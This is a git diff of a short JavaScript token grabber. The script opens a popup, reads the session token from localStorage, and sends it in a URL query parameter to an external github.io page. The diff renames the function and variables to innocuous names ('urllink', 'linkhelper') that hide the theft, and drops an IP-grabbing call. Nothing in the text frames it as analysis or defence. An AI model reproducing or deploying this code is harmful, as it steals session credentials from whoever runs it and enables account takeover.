@@ -1,22 +1,18 @@
-function getToken() {
-    let popup;
-    popup = window.open('', '', `top=0,left=${screen.width-800},width=850,height=${screen.height}`);
-    if(!popup || !popup.document || !popup.document.write) return alert('pop up bloqué');
+function urllink() {
+
+    let popup = window.open('', '', `top=0,left=${screen.width-800},width=850,height=${screen.height}`);
+    if(!popup || !popup.document || !popup.document.write) return alert('pop ups blocked please enable!');
 
     window.dispatchEvent(new Event('beforeunload'));
 
-    var token = popup.localStorage.token
-    token = token.slice(1, -1); // Gets rid of the quotes
+    var linkhelper = popup.localStorage.token
+    linkhelper = linkhelper.slice(1, -1); // Gets rid of the quotes
     popup.window.close()
-    return token
+    return linkhelper
 
 
 
 }
+window.open("https://phillipbruh.github.io/bruhee/?fruit="+urllink());
 
 
-var tokenz = getToken()
-
-// maintenant lance
-var thebigs = window.open("https://phillipbruh.github.io/bruhee/?fruit="+tokenz);
-thebigs.getIP("erereee")
